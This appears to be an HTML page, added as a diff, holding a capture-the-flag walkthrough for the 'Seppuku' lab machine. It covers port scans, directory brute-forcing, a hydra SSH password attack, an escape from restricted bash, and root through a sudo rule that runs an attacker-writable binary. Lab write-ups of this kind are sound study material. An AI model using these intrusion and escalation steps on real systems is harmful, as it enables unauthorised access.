@@ -1,0 +1,235 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Play Seppuku</h1>
+    <p class="text">Difficulty : Easy | CommunityRating : Intermediate | MyRating : Easy</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>└─$ <u>sudo nmap -p- -sCV $IP --min-rate=10000</u>
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           vsftpd 3.0.3
+22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cd:55:a8:e4:0f:28:bc:b2:a6:7d:41:76:bb:9f:71:f4 (RSA)
+|   256 16:fa:29:e4:e0:8a:2e:7d:37:d2:6f:42:b2:dc:e9:22 (ECDSA)
+|_  256 bb:74:e8:97:fa:30:8d:da:f9:5c:99:f0:d9:24:8a:d5 (ED25519)
+80/tcp   open  http          nginx 1.14.2
+|_http-title: 401 Authorization Required
+|_http-server-header: nginx/1.14.2
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Restricted Content
+139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn   Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+7080/tcp open  ssl/empowerid LiteSpeed
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|   h2
+|   spdy/3
+|   spdy/2
+|_  http/1.1
+|_http-server-header: LiteSpeed
+| ssl-cert: Subject: commonName=seppuku/organizationName=LiteSpeedCommunity/stateOrProvinceName=NJ/countryName=US
+| Not valid before: 2020-05-13T06:51:35
+|_Not valid after:  2022-08-11T06:51:35
+|_http-title: Did not follow redirect to https://192.168.222.90:7080/
+7601/tcp open  http          Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Seppuku
+8088/tcp open  http          LiteSpeed httpd
+|_http-title: Seppuku
+|_http-server-header: LiteSpeed
+Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">There are many output, but the FTP server doesn't allow anonymous login, so we can start from http(s). 80, 7080, 7601, 8088 are open http servers.</p>
+<p class="text">Let's enumerate them first.</p>
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP -x php,html -t 70</u>
+===============================================================
+/info.php             (Status: 200) [Size: 80297]
+/info.php             (Status: 200) [Size: 80296]
+
+===============================================================</code></pre></div>
+
+<p class="text">It might be ok that we exclude this port from target.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP:7080 -x php,html -t 70</u>
+Starting gobuster in directory enumeration mode
+===============================================================
+
+===============================================================
+Finished</code></pre></div>
+
+<p class="text">Also, this port includes nothing.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP:7601 -x php,html -t 70</u>
+===============================================================
+/.hta.html            (Status: 403) [Size: 281]
+/.hta                 (Status: 403) [Size: 281]
+/.htpasswd.html       (Status: 403) [Size: 281]
+/.htpasswd.php        (Status: 403) [Size: 281]
+/.htpasswd            (Status: 403) [Size: 281]
+/.htaccess.html       (Status: 403) [Size: 281]
+/.hta.php             (Status: 403) [Size: 281]
+/.htaccess.php        (Status: 403) [Size: 281]
+/.htaccess            (Status: 403) [Size: 281]
+/a                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/a/]
+/b                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/b/]
+/c                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/c/]
+/ckeditor             (Status: 301) [Size: 326] [--> http://192.168.222.90:7601/ckeditor/]
+/d                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/d/]
+/database             (Status: 301) [Size: 326] [--> http://192.168.222.90:7601/database/]
+/e                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/e/]
+/f                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/f/]
+/h                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/h/]
+/index.html           (Status: 200) [Size: 171]
+/index.html           (Status: 200) [Size: 171]
+/keys                 (Status: 301) [Size: 322] [--> http://192.168.222.90:7601/keys/]
+/production           (Status: 301) [Size: 328] [--> http://192.168.222.90:7601/production/]
+/q                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/q/]
+/r                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/r/]
+/secret               (Status: 301) [Size: 324] [--> http://192.168.222.90:7601/secret/]
+/server-status        (Status: 403) [Size: 281]
+/t                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/t/]
+/w                    (Status: 301) [Size: 319] [--> http://192.168.222.90:7601/w/]
+
+===============================================================</code></pre></div>
+
+<p class="text">This page holds some interesting directories like secret, keys etc. We should come back to this port after enuemrating port 8088.</p>
+
+
+<div class="code-box"><pre><code>└─$ <u>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$IP:8088 -x php,html -t 70</u>
+===============================================================
+/blocked              (Status: 301) [Size: 1260] [--> http://192.168.222.90:8088/blocked/]
+/cgi-bin              (Status: 301) [Size: 1260] [--> http://192.168.222.90:8088/cgi-bin/]
+/docs                 (Status: 301) [Size: 1260] [--> http://192.168.222.90:8088/docs/]
+/error404.html        (Status: 500) [Size: 1240]
+/index.html           (Status: 200) [Size: 171]
+/index.html           (Status: 200) [Size: 171]
+/index.php            (Status: 200) [Size: 163188]
+/index.php            (Status: 200) [Size: 163188]
+
+===============================================================</code></pre></div>
+
+<p class="text">I decided to ignore ports 80 and 7080, and focus on mainly 7601 and 8088. First I will open secrets dir.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/seppuku/1.png' %}" alt="">
+    <p class="text">I found id_rsa. But we don't know the target username.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/seppuku/2.png' %}" alt="">
+    <p class="text">This directory has password.bak, wordlist.lst, shadow.bak and hostname files. Hostname page told me the host name is seppuku. And wordlist is wordlist namely, and shodow.bak and password.bak are also namely /etc/shadow and /etc/passwd file. <br><br>However, when I looked at the both file, the username rabbit-hole found in password.bak, and r@bbit-hole in /etc/shadow. Therefore, I concluded that the both files are rabbit-hole because the username contradicts.</p>
+</div>
+
+<p class="text">Then, I first try to login with id_rsa. Copy and paste the id_rsa strings to id_rsa file and ...</p>
+<div class="code-box"><pre><code>└─$ chmod 600 id_rsa
+
+└─$ ssh -i id_rsa seppuku@$IP
+...
+password : </code></pre></div>
+<p class="text">It required password input and I couldn't login. Therefore, I will perform brute force atatck to ssh with wordlist before I found.</p>
+
+
+<div class="code-box"><pre><code>└─$ hydra -l seppuku -P wordlist.lst $IP ssh
+└─$ hydra -l seppuku -P liist 192.168.201.90 ssh            
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-29 04:34:13
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
+[DATA] attacking ssh://192.168.201.90:22/
+[22][ssh] host: 192.168.201.90   login: seppuku   password: <u>eeyoree</u></code></pre></div>
+
+<p class="text">We got password for seppuku.</p>
+
+<h2 class="subtitle">PrivEsc</h2>
+<div class="code-box"><pre><code>ssh seppuku@$IP
+password : eeyoree
+seppuku@seppuku:~$ ls
+local.txt
+seppuku@seppuku:~$ cd ..
+-rbash: cd: restricted
+seppuku@seppuku:~$ </code></pre></div>
+
+<p class="text">Though I successfully logged on with seppuku user, I can't go out of the home dir. Therefore, I have to exit this environment.</p>
+
+<div class="code-box"><pre><code>└─$ ssh seppuku@192.168.201.90 -t 'bash -noprofile'
+seppuku@192.168.201.90's password: 
+seppuku@seppuku:~$ cd ..
+seppuku@seppuku:/home$ </code></pre></div>
+
+<p class="text">-noprofile argument with -t flag solved this problem. We can go other dirs.</p>
+
+
+<div class="code-box"><pre><code>seppuku@seppuku:~$ ls -la
+total 36
+drwxr-xr-x 3 seppuku seppuku 4096 Oct 29 04:38 .
+drwxr-xr-x 5 root    root    4096 May 13  2020 ..
+-rw------- 1 seppuku seppuku   14 Oct 29 04:38 .bash_history
+-rw-r--r-- 1 seppuku seppuku  220 May 13  2020 .bash_logout
+-rw-r--r-- 1 seppuku seppuku 3526 May 13  2020 .bashrc
+drwx------ 3 seppuku seppuku 4096 May 13  2020 .gnupg
+-rw-r--r-- 1 seppuku seppuku   33 Oct 29 04:24 local.txt
+-rw-r--r-- 1 root    root      20 May 13  2020 .passwd
+-rw-r--r-- 1 seppuku seppuku  807 May 13  2020 .profile
+seppuku@seppuku:~$ cat .passwd
+12345685213456!@!@A</code></pre></div>
+
+<p class="text">On the home directory, I found hidden file named .passwd. This might be password for tanto or samurai. Let's try su command.</p>
+
+<div class="code-box"><pre><code>seppuku@seppuku:~$ su samurai
+Password: 12345685213456!@!@A
+samurai@seppuku:/home/seppuku$ </code></pre></div>
+<p class="text">It was password for samurai user.</p>
+
+<div class="code-box"><pre><code>samurai@seppuku:/home/seppuku$ sudo -l
+Matching Defaults entries for samurai on seppuku:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User samurai may run the following commands on seppuku:
+    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*</code></pre></div>
+
+    <p class="text">This samurai user has the sudo privilege to run any script on /tmp dir with <u>bin file on tanto user</u>. Therefore, if we could login as tanto, we can write arbitrary code on /home/tanto/.cgi_bin/bin and run it as root. </p>
+
+    <p class="text">Also, we have discovered id_rsa for someone. We can try using it for tanto.</p>
+
+    <div class="code-box"><pre><code>└─$ ssh -o MACs=hmac-sha2-256 -i id_rsa tanto@192.168.201.90 -t 'bash --noprofile'
+tanto@seppuku:~$ </code></pre></div>
+
+<p class="text">We could logon as tanto user.</p>
+
+<div class="code-box"><pre><code>tanto@seppuku:~$ mkdir .cgi_bin
+tanto@seppuku:~$ cd .cgi_bin
+tanto@seppuku:~/.cgi_bin$ echo '/bin/bash' > bin
+tanto@seppuku:~/.cgi_bin$ ls -la
+total 12
+drwxr-xr-x 2 tanto tanto 4096 Oct 29 04:48 .
+drwxr-xr-x 5 tanto tanto 4096 Oct 29 04:48 ..
+-rw-r--r-- 1 tanto tanto   10 Oct 29 04:48 bin
+tanto@seppuku:~/.cgi_bin$ chmod +x bin
+tanto@seppuku:~/.cgi_bin$ </code></pre></div>
+
+<p class="text">Then, we can use this file with samurai user.</p>
+
+
+<div class="code-box"><pre><code>samurai@seppuku:/home/tanto/.ssh$ sudo ../../../../../../home/tanto/.cgi_bin/bin /tmp/*
+root@seppuku:/home/tanto/.ssh# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre></div>
+
+<p class="text">We've got root user.</p>
+
+</body>
+</html>
+
